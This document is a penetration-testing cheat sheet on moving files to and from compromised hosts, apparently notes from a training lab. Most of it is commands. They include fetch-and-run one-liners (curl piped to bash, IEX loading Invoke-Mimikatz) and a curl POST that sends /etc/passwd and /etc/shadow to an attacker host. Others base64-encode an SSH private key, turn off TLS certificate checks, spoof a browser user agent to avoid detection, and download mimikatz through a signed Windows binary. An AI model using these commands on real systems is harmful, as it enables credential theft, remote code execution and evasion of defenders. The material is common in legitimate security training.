# File Transfers

## Download Operations

## Terminal String Copy & Paste

### Linux Encode Base64

{% code overflow="wrap" %}
```
cat id_rsa |base64 -w 0;echo
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### Windows Decode & Write Base64

{% code overflow="wrap" %}
```
[IO.File]::WriteAllBytes("C:\path\to\file", [Convert]::FromBase64String("BASE 64 STRING"))
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption><p>cmd.exe has a maximum string length of 8,191 &#x26; powershell.exe has a maximum string length 2,147,483,647 characters</p></figcaption></figure>

## Web Downloads with Wget & cURL

### **Download a File Using wget**

{% code overflow="wrap" %}
```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

### **Fileless Download with wget**

{% code overflow="wrap" %}
```
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

### **Download a File Using cURL**

{% code overflow="wrap" %}
```
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### **Fileless Download with cURL**

{% code overflow="wrap" %}
```
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Download with Bash (/dev/tcp)

### **Connect to the Target Webserver**

{% code overflow="wrap" %}
```
exec 3<>/dev/tcp/10.10.10.32/80
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

### **HTTP GET Request**

{% code overflow="wrap" %}
```
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

### **Print the Response**

{% code overflow="wrap" %}
```
cat <&3
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

## PowerShell Web Downloads

### **DownloadFile Method**

{% code overflow="wrap" %}
```
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### **DownloadString - Fileless Method**

{% code overflow="wrap" %}
```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### **Invoke-WebRequest**

{% code overflow="wrap" %}
```
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption><p>You can use the aliases <code>iwr</code>, <code>curl</code>, and <code>wget</code> instead of the <code>Invoke-WebRequest</code> full name</p></figcaption></figure>

### **Common Errors with PowerShell**

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption><p>There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter -UseBasicParsing</p></figcaption></figure>

{% code overflow="wrap" %}
```
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```powershell-session
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption><p>Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command</p></figcaption></figure>

{% code overflow="wrap" %}
```
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
{% endcode %}

## SMB Downloads



### **Create the SMB Server**

{% code overflow="wrap" %}
```
sudo impacket-smbserver share -smb2support /tmp/smbshare
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Copy a File from the SMB Server

{% code overflow="wrap" %}
```
copy \\192.168.220.133\share\nc.exe
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption><p>New versions of Windows block unauthenticated guest access</p></figcaption></figure>

### **Create the SMB Server with Username & Password**

{% code overflow="wrap" %}
```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

### **Mount the SMB Server with Username and Password**

{% code overflow="wrap" %}
```
net use n: \\192.168.220.133\share /user:test test
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption><p>You can also mount the SMB server if you receive an error when you use <code>copy filename \\IP\sharename</code>.</p></figcaption></figure>

## FTP Downloads

### **Installing the FTP Server Python3 Module - pyftpdlib**

{% code overflow="wrap" %}
```
sudo pip3 install pyftpdlib
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### **Setting up a Python3 FTP Server**

{% code overflow="wrap" %}
```
sudo python3 -m pyftpdlib --port 21
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

### **Transfering Files from an FTP Server Using PowerShell**

{% code overflow="wrap" %}
```
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

### **Command File for FTP Client To Download File**

{% code overflow="wrap" %}
```
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption><p>You may not have an interactive shell. If that's the case, we can create an FTP command file to download a file</p></figcaption></figure>

## Upload Operations

## Terminal String Copy & Paste

### Windows Encode & Write Base64

{% code overflow="wrap" %}
```
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

### Linux Decode Base64

{% code overflow="wrap" %}
```
echo Base64string | base64 -d > hosts
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

## Web Uploads with cURL

{% code overflow="wrap" %}
```
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

## PowerShell Web Uploads

### **Installing a Configured WebServer with Upload**

{% code overflow="wrap" %}
```
pip3 install uploadserver
```
{% endcode %}

```
python3 -m uploadserver
```

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

### **PowerShell Script to Upload a File to Python Upload Server**

{% code overflow="wrap" %}
```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```
{% endcode %}

{% code overflow="wrap" %}
```
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

### PowerShell Base64 Web Upload

{% code overflow="wrap" %}
```
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
```
{% endcode %}

{% code overflow="wrap" %}
```
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
nc -lvnp 8000
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
echo <base64> | base64 -d -w 0 > hosts
```
{% endcode %}

## SMB Uploads

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption><p>Commonly enterprises don't allow the SMB protocol (TCP/445). An alternative is to run SMB over HTTP with <code>WebDav</code>. When you use <code>SMB</code>, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP</p></figcaption></figure>

### **Installing WebDav Python modules**

{% code overflow="wrap" %}
```
sudo pip3 install wsgidav cheroot
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

### **Using the WebDav Python module**

{% code overflow="wrap" %}
```
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

### **Connecting to the Webdav Share**

{% code overflow="wrap" %}
```
dir \\192.168.49.128\DavWWWRoot
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption><p>DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder</p></figcaption></figure>

### **Uploading Files using SMB**

{% code overflow="wrap" %}
```
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```
{% endcode %}

{% code overflow="wrap" %}
```
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption><p>If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.</p></figcaption></figure>

### FTP Uploads

```
sudo python3 -m pyftpdlib --port 21 --write
```

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption><p> You need to specify the option <code>--write</code> to allow clients to upload files to our attack host</p></figcaption></figure>

### **PowerShell Upload File**

{% code overflow="wrap" %}
```
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

### **Command File for FTP Client to Upload File**

{% code overflow="wrap" %}
```
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

## **Mounting a Linux Folder With RDP**

### **Mounting Using rdesktop**

{% code overflow="wrap" %}
```
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

### **Mounting Using xfreerdp**

{% code overflow="wrap" %}
```
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

## Evading Detection

### **Listing out User Agents**

{% code overflow="wrap" %}
```
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

### **Request with Chrome User Agent**

{% code overflow="wrap" %}
```
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
```
{% endcode %}

{% code overflow="wrap" %}
```
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### **Transferring File with GfxDownloadWrapper.exe**

{% code overflow="wrap" %}
```
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
